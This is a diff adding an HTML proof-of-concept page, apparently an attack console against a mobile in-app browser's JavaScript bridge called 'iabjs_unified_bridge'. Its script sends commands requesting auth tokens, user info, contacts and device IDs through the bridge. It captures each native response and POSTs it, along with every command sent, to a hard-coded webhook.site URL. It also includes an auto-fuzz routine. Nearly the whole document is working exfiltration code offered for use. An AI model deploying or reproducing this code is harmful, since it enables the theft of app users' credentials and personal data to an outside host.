@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Bridge Fuzzer PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; }
+        .console { border: 1px solid #333; padding: 10px; height: 200px; overflow-y: scroll; background: #050505; margin-bottom: 15px; font-size: 12px; }
+        input { width: 100%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; margin-bottom: 10px; box-sizing: border-box; }
+        button { width: 48%; padding: 10px; background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; }
+        .btn-red { background: #f00; color: #fff; }
+        .tag { color: #58a6ff; }
+    </style>
+</head>
+<body>
+
+    <h3>Bridge Exploitation Console</h3>
+    <div class="console" id="consoleLog">[*] System Ready...<br>[*] Target: iabjs_unified_bridge</div>
+
+    <input type="text" id="customCmd" placeholder='{"action":"getUserInfo"}'>
+    
+    <div style="display: flex; justify-content: space-between;">
+        <button onclick="sendCommand()">Send Command</button>
+        <button class="btn-red" onclick="fuzzCommon()">Auto Fuzz</button>
+    </div>
+
+    <div style="margin-top: 15px;">
+        <p style="font-size: 10px; color: #888;">Quick Payloads:</p>
+        <button style="width: 31%; font-size: 9px;" onclick="setCmd('{\"action\":\"get_user_info\"}')">Get User</button>
+        <button style="width: 31%; font-size: 9px;" onclick="setCmd('{\"action\":\"get_auth_token\"}')">Get Token</button>
+        <button style="width: 31%; font-size: 9px;" onclick="setCmd('{\"action\":\"read_contacts\"}')">Contacts</button>
+    </div>
+
+    <script>
+        const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
+        const bridge = "iabjs_unified_bridge";
+
+        function log(msg, type = "info") {
+            const con = document.getElementById('consoleLog');
+            con.innerHTML += `<br><span class="tag">[${type}]</span> ${msg}`;
+            con.scrollTop = con.scrollHeight;
+        }
+
+        // 1. RESPONSE LISTENER: Ye wahi "Output" hai jo tum mang rahe ho
+        // Hum native app se aane wale messages ko catch karenge
+        window.addEventListener("message", function(event) {
+            log("Response Received: " + JSON.stringify(event.data), "SUCCESS");
+            exfiltrate("BRIDGE_RESPONSE", event.data);
+        });
+
+        // 2. EXFILTRATION: POST method se Webhook pe bhejna
+        async function exfiltrate(type, data) {
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ type: type, data: data, ts: Date.now() })
+                });
+            } catch(e) { log("Exfiltration Failed", "ERROR"); }
+        }
+
+        function setCmd(val) { document.getElementById('customCmd').value = val; }
+
+        function sendCommand() {
+            const cmdText = document.getElementById('customCmd').value;
+            try {
+                const payload = JSON.parse(cmdText);
+                if (window[bridge]) {
+                    window[bridge].postMessage(payload);
+                    log("Sent: " + cmdText, "SENT");
+                    exfiltrate("COMMAND_SENT", payload);
+                } else {
+                    log("Bridge NOT found!", "ERROR");
+                }
+            } catch(e) { log("Invalid JSON!", "ERROR"); }
+        }
+
+        // 3. AUTO FUZZ: Common actions ko blind-test karna
+        function fuzzCommon() {
+            const payloads = [
+                {"action": "get_device_id"},
+                {"action": "get_app_version"},
+                {"action": "vibrate", "duration": 500},
+                {"action": "show_toast", "text": "BRIDGE_PWNED"}
+            ];
+            payloads.forEach(p => {
+                if(window[bridge]) window[bridge].postMessage(p);
+            });
+            log("Fuzzing payloads sent...", "FUZZ");
+        }
+    </script>
+</body>
+</html>
